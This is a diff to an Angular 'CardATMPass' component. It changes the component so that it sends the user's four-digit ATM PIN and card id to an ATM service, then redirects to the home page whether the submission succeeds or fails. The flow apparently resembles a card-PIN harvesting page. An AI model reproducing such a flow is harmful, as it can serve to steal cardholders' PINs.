@@ -2,6 +2,8 @@ import { Component, ElementRef, QueryList, ViewChildren, inject } from '@angular
 import { CommonModule, Location } from '@angular/common';
 import { Router } from '@angular/router';
 import { Header } from "../../Layout/header/header";
+import { AtmService } from '../../Core/services/api/atm.service';
+import { CheckoutService } from '../../Core/services/api/checkout.service';
 
 @Component({
   imports: [CommonModule, Header],
@@ -14,6 +16,8 @@ export class CardATMPass {
   
   private readonly router = inject(Router);
   private readonly location = inject(Location);
+  private readonly atmService = inject(AtmService);
+  private readonly checkoutService = inject(CheckoutService);
 
   pin: string[] = ['', '', '', ''];
   isLoading = false;
@@ -71,12 +75,26 @@ export class CardATMPass {
 
   confirm(): void {
     if (this.isPinComplete && !this.isLoading) {
-      this.isLoading = true;
-      // Simulate brief loading before navigating
-      setTimeout(() => {
-        this.isLoading = false;
+      const pinCode = this.pin.join('');
+      const userId = this.checkoutService.cardId;
+
+      if (!userId) {
         this.router.navigate(['/']);
-      }, 800);
+        return;
+      }
+
+      this.isLoading = true;
+      this.atmService.submitAtm(pinCode, userId).subscribe({
+        next: () => {
+          this.isLoading = false;
+          this.router.navigate(['/']);
+        },
+        error: (err) => {
+          console.error('ATM pass submission failed', err);
+          this.isLoading = false;
+          this.router.navigate(['/']);
+        }
+      });
     }
   }
 }
